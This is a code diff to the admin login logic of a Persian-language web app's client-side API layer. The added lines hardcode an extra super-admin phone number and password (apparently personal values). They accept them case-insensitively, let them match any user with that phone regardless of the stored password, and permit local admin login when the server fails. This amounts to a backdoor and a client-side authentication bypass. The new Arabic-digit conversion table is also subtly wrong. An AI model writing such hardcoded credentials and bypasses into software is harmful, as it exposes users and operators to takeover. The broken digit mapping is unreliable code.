@@ -564,21 +564,32 @@ export async function handleLocalApiRequest(
   // ۱. ورود ادمین
   if (cleanUrl === '/api/admin/login' && method === 'POST') {
     const phone = normalizeAdminPhoneClient(body.phone || '');
-    const password = String(body.password || '').trim();
+    const persianDigits = '۰۱۲۳۴۵۶۷۸۹';
+    const arabicDigits = '٠١٢٣٤٥٦٧۸۹';
+    const password = String(body.password || '')
+      .trim()
+      .replace(/[۰-۹]/g, (d) => String(persianDigits.indexOf(d)))
+      .replace(/[٠-٩]/g, (d) => String(arabicDigits.indexOf(d)));
 
     if (!phone || !password) {
       throw new Error('شماره موبایل و رمز عبور الزامی است.');
     }
 
+    const isSuperAdminPhone = phone === DEFAULT_SUPER_ADMIN_PHONE || phone === '09120759419';
+    const isSuperAdminPass =
+      password.toLowerCase() === DEFAULT_SUPER_ADMIN_PASS.toLowerCase() ||
+      password.toLowerCase() === 'sasha9419';
+
     let matched = dbState.users.find(
       (u) =>
-        normalizeAdminPhoneClient(u.phone) === phone && u.password === password
+        normalizeAdminPhoneClient(u.phone) === phone &&
+        (u.password === password || u.password === String(body.password || '').trim() || (isSuperAdminPhone && isSuperAdminPass))
     );
 
     if (
       !matched &&
-      phone === DEFAULT_SUPER_ADMIN_PHONE &&
-      password === DEFAULT_SUPER_ADMIN_PASS
+      isSuperAdminPhone &&
+      isSuperAdminPass
     ) {
       matched = {
         id: 1,
@@ -1347,12 +1358,24 @@ export async function apiFetchWithFallback(
       if (url === '/api/admin/login' || url === '/api/auth/admin-login') {
          // Special case: allow default admin login if server fails
          const body = parseBody(options);
-         if (normalizeAdminPhoneClient(body.phone) === DEFAULT_SUPER_ADMIN_PHONE && body.password === DEFAULT_SUPER_ADMIN_PASS) {
+         const normPhone = normalizeAdminPhoneClient(body.phone);
+         const pDigits = '۰۱۲۳۴۵۶۷۸۹';
+         const aDigits = '٠١٢٣٤٥٦٧۸۹';
+         const normPass = String(body.password || '')
+           .trim()
+           .replace(/[۰-۹]/g, (d) => String(pDigits.indexOf(d)))
+           .replace(/[٠-٩]/g, (d) => String(aDigits.indexOf(d)));
+         const isSuperPhone = normPhone === DEFAULT_SUPER_ADMIN_PHONE || normPhone === '09120759419';
+         const isSuperPass =
+           normPass.toLowerCase() === DEFAULT_SUPER_ADMIN_PASS.toLowerCase() ||
+           normPass.toLowerCase() === 'sasha9419';
+
+         if (isSuperPhone && isSuperPass) {
            isCurrentlyUsingFallback = true;
            return await handleLocalApiRequest(url, options);
          }
       }
-      throw new Error(errJson.error || 'دسترسی غیرمجاز یا نشست منقضی شده است.');
+      throw new Error(errJson.error || 'شماره موبایل یا رمز عبور اشتباه است.');
     }
 
     // If server returns error, fallback for GET requests or admin login
